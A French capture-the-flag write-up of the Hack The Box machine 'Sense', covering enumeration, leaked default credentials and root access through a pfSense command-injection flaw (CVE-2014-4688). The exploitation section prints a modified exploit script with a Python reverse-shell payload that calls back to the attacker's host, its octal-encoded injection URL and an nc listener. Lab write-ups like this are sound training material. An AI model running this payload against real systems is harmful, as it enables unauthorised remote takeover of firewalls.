---
tags:
  - htb
  - cve
  - web
  - pfsense
  - enum
title: Sense
os: OpenBSD
difficulty: Easy
date: 2025-11-23
status: terminé
draft: "true"
---
---
# Sense

> [!summary] Résumé rapide  
> (Compléter après la machine : vecteur d’entrée + privesc)

---

## 🟦 Informations générales

- **Nom de la machine :** Sense
- **OS :** OpenBSD
- **Difficulty :** Facile
- **Auteur :** lkys37en
- **Date :** 23/11/2025
- **Statut :** Terminée

---
## 🟦 1. Reconnaissance réseau


> [!info] 1.2 Nmap – Scan initial

```bash
nmap -p- 10.129.125.26 --min-rate 5000
```

**Services découverts :**

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-23 15:43 CET
Nmap scan report for 10.129.125.26
Host is up (0.10s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT    STATE SERVICE
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 26.89 seconds
```


> [!info] 1.3 Nmap – Scan complet

```bash
nmap -sVC -p80,443 10.129.125.26 -oN sense.nmap
```

**Infos supplémentaires :**

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-23 15:44 CET
Nmap scan report for 10.129.125.26
Host is up (0.039s latency).

PORT    STATE SERVICE  VERSION
80/tcp  open  http     lighttpd 1.4.35
|_http-title: Did not follow redirect to https://10.129.125.26/
|_http-server-header: lighttpd/1.4.35
443/tcp open  ssl/http lighttpd 1.4.35
|_ssl-date: TLS randomness does not represent time
|_http-title: Login
| ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US
| Not valid before: 2017-10-14T19:21:35
|_Not valid after:  2023-04-06T19:21:35
|_http-server-header: lighttpd/1.4.35

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.12 seconds
```

Le port 80 (HTTP) est redirigé vers le port 443 (HTTPS).
la version de Lighttpd (1.4.35) date du 12/03/2014.

**Scan nmap avec les scripts de vulnérabilités :**
```bash
nmap -script vuln -p80,443 sense.htb
```

résultat :

Principalement des retours sur la config SSL qui permettrait des attaques de type MITM.

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-23 15:47 CET
Nmap scan report for sense.htb (10.129.125.26)
Host is up (0.020s latency).

PORT    STATE SERVICE
<snipe>

443/tcp open  https
| http-enum: 
|   /javascript/sorttable.js: Secunia NSI
|   /changelog.txt: Interesting, a changelog.
|_  /tree/: Potentially interesting folder

<snipe>
```

On note par contre la présence de fichiers intéressants à regarder comme le `changelog.txt`.

---
## 🟦 2. Analyse des services

### 🌐 HTTPS / Web

On accède à une page de login pour **pfSense**, un panel de contrôle pour un pare-feu open source :
![[Pasted image 20251123155936.png]]

Tenter des identifiants comme `admin:password`, `admin:admin` ou `admin:pfSense` ne donne aucun accès. De plus les champs ne semble pas sensible à une injection SQL.

Si on va sur le dossier changelog.txt :
```markdown
# Security Changelog 

### Issue
There was a failure in updating the firewall. Manual patching is therefore required

### Mitigated
2 of 3 vulnerabilities have been patched.

### Timeline
The remaining patches will be installed during the next maintenance window
```

On sait donc qu'il doit exister une vulnérabilité qui n'a pas encore été patchée sur la version actuelle de pfSense.

> [!info] Fuzzing

```bash
gobuster dir -w ~/Pentest/Wordlists/dirb/common.txt -u https://10.129.125.26/ --no-tls-validation
```

> **Note** : le flag `--no-tls-validation` permet de passer outre la validation du certificat pour le HTTPS

```bash
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://10.129.125.26/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/shep/Pentest/Wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/classes              (Status: 301) [Size: 0] [--> https://10.129.125.26/classes/]
/css                  (Status: 301) [Size: 0] [--> https://10.129.125.26/css/]
/favicon.ico          (Status: 200) [Size: 1406]
/includes             (Status: 301) [Size: 0] [--> https://10.129.125.26/includes/]
/index.html           (Status: 200) [Size: 329]
/index.php            (Status: 200) [Size: 6690]
/installer            (Status: 301) [Size: 0] [--> https://10.129.125.26/installer/]
/javascript           (Status: 301) [Size: 0] [--> https://10.129.125.26/javascript/]
/themes               (Status: 301) [Size: 0] [--> https://10.129.125.26/themes/]
/tree                 (Status: 301) [Size: 0] [--> https://10.129.125.26/tree/]
/widgets              (Status: 301) [Size: 0] [--> https://10.129.125.26/widgets/]
/xmlrpc.php           (Status: 200) [Size: 384]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================
```

À part le changelog que nous avions déjà découvert, il n'y a rien d'autre d'intéressant; On peut tenter un scan plus lent avec une liste plus longue :

```bash
gobuster dir -w ~/Pentest/Wordlists/dirbuster/directory-list-2.3-medium.txt -x txt -u https://10.129.125.26/ --no-tls-validation
```

On trouve un fichier `system-users.txt` qui une fois query contient les informations suivantes :

```markdown
####Support ticket###

Please create the following user


username: Rohit
password: company defaults
```

Tenter de se connecter avec l'identifiant `rohit:pfsense` donne accès à la page :

![[Pasted image 20251123165250.png]]

**Technos détectées :** 
-  Lighttpd/1.4.35
-  PHP
-  pfSense/2.1.3 - FreeBSD/8.3

---
## 🟦 3. Points d’entrée potentiels

-  Un `searchsploit` avec pfSense semble montrer que les versions <= 2.1.4 sont vulnérable à une exécution de commande sur la page `status_rrd_graph_img.php` 

---

## 🟦 4. Exploitation

> [!tip] 4.1 PoC

Si on tente l'exploit suivant : [CVE-2014-4688](https://www.exploit-db.com/exploits/43560), l'exécution se termine mais on obtient pas de Shell.

On peut ajouter la ligne suivante une fois que le payload a été créé :
```python
# command to be converted into octal
command = """
python -c 'import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("%s",%s));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);'
""" % (lhost, lport)

payload = ""

# encode payload in octal
for char in command:
	payload += ("\\" + oct(ord(char)).lstrip("0o"))

login_url = 'https://' + rhost + '/index.php'
exploit_url = "https://" + rhost + "/status_rrd_graph_img.php?database=queues;"+"printf+" + "'" + payload + "'|sh"

print(exploit_url)
```

exécuter la commande suivante donne l'url à query :
```bash
python3 exploit.py --rhost 10.129.125.26 --lhost 10.10.14.112 --lport 1337 --username rohit --password pfsense
```

```bash
https://10.129.125.26/status_rrd_graph_img.php?database=queues;printf+'\12\160\171\164\150\157\156\40\55\143\40\47\151\155\160\157\162\164\40\163\157\143\153\145\164\54\163\165\142\160\162\157\143\145\163\163\54\157\163\73\12\163\75\163\157\143\153\145\164\56\163\157\143\153\145\164\50\163\157\143\153\145\164\56\101\106\137\111\116\105\124\54\163\157\143\153\145\164\56\123\117\103\113\137\123\124\122\105\101\115\51\73\12\163\56\143\157\156\156\145\143\164\50\50\42\61\60\56\61\60\56\61\64\56\61\61\62\42\54\61\63\63\67\51\51\73\12\157\163\56\144\165\160\62\50\163\56\146\151\154\145\156\157\50\51\54\60\51\73\12\157\163\56\144\165\160\62\50\163\56\146\151\154\145\156\157\50\51\54\61\51\73\12\157\163\56\144\165\160\62\50\163\56\146\151\154\145\156\157\50\51\54\62\51\73\12\160\75\163\165\142\160\162\157\143\145\163\163\56\143\141\154\154\50\133\42\57\142\151\156\57\163\150\42\54\42\55\151\42\135\51\73\47\12'|sh
```

On ouvre un listener en local

```bash
nc -lnvp 1337
```


On peut alors effectuer la requête dans BurpSuite :

![[Pasted image 20251123172453.png]]

**Résultat :**  On obtient alors un reverse shell

**Accès obtenu :**  
- User :  root
- Contexte :  shell

![[Pasted image 20251123172954.png]]

---

## 🟦 7. Résumé final

> [!success] Ce que j’ai appris  
-  Utiliser manuellement un exploit qui échoue en exécution automatique

> [!failure] Ce que j’ai raté / À éviter  
-  Il faut pas hésiter à énumérer avec des listes plus longues

> [!attention] Patterns utiles  
-  Recherche d'exploits avec `searchsploit` et le flag `-p`